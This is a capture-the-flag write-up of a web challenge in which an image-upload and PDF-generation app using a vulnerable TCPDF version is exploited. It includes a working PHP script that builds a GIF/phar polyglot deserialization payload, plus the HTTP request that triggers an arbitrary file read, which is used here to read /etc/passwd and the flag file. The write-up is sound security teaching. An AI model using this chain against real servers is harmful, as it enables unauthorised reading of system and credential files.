## Introduction
This challenge gives us a web app and its [source code](https://github.com/everping/ctfs/blob/master/2019/chaos_communication_camp_2019/code-6c8fe52c26dec8c08d407bef5a52598d39dbf8b3.zip). Basically, the flow of that web app is:
- Users upload an image (png, jpg, jpeg, gif) and get the uploaded url
- Users post arbitrary html content to generate a pdf, the above image url can be included in the html content

## Analysis
Firstly, I uploaded a malformed image and got an error related to `imagemagick` in the process of creating pdf file by `tcpdf` library. This made me think of the idea of [imagetragick](https://imagetragick.com/). However, I threw this thought away when I saw functions that check the format of image files through their exif. That check prevent us to create a completed payload for the imagetragick attack.

```php
	if(function_exists('exif_imagetype')) { //Die exif_imagetype-Funktion erfordert die exif-Erweiterung auf dem Server
	 $allowed_types = array(IMAGETYPE_PNG, IMAGETYPE_JPEG, IMAGETYPE_GIF);
	 $detected_type = exif_imagetype($_FILES['file']['tmp_name']);
	 
	 
	 if(!in_array($detected_type, $allowed_types)) {
	 echo("<div class=\"container\">Only pictures allowed!</div>");
	 return;
	 }
	}
```


By googling about `tcpdf` library, I found a deserialization vulnerability in its [old version](https://packetstormsecurity.com/files/152200/TCPDF-6.2.19-Deserialization-Remote-Code-Execution.html). I reviewed our source code and compared it to that exploit and realized that we have ideal factors to create a perfect attack:
- tcpdf version 6.2.13 affected by that vulnerability
- A destruct method is defined in class PDFCreator (creator.php), this method included `file_get_contents()` function that can be trigged to read arbitrary files in the server.

## Exploit
The exploit code provided in [that paper](https://packetstormsecurity.com/files/152200/TCPDF-6.2.19-Deserialization-Remote-Code-Execution.html) is very straightforward, we can use it with a little bit of modifying. Below is what I did:
### 1. Create a valid image included the payload by using the code below
```php
<?php
namespace PDFStuff {
	
	# Define the vulnerable class
	class PDFCreator { public $tmpfile; }
	
	$phar_file = "poc.phar";
	$image_file = "poc.gif";

	# Initialize a Phar class
	$phar = new \Phar($phar_file);
	$phar->startBuffering();
	$phar->addFromString("test.txt", "test");
	
	# Set stub with gif prefix to bypass image checking
	$phar->setStub("GIF89a<?php __HALT_COMPILER();");

	$payload = new PDFCreator();
	
	# Create a payload to read flag file
	$payload->tmpfile = "/var/www/site/flag.php"; 
	$phar->setMetadata($payload);
	$phar->stopBuffering();
	rename($phar_file, $image_file);
}
```
If you want to try it, save it as a php file (payload.php) and turn off `phar.readonly` directive in `php.ini` then execute the command `php payload.php`. You will get file `poc.gif` and use it to do next steps.
I should explain a bit about some special points in my code:
- `GIF89a` is included as the prefix of output file because I want to bypass extension checking
- We have to pass to `$payload->tmpfile` the file we want to read. I tried with `flag.php` and got failed, but `/etc/passwd` worked so I think we need an absolute path. I read `/etc/apache2/sites-enabled/000-default.conf` first to get the full path of web source code and then luckily, I found `/var/www/site/flag.php`

### 2. Upload file and get flag
- From frontend, upload the created `poc.gif` and get the uploaded url
- Create a request like below to get pdf, the flag will be included in the response
```
POST /index.php HTTP/1.1
Host: hax.allesctf.net:3333

pdfcontent=<img src="phar://upload/df911f0151f9ef021d410b4be5060972.gif">
```
- Flag is `ALLES{phar_jpeg_polyglot_madness_such_w0w}`
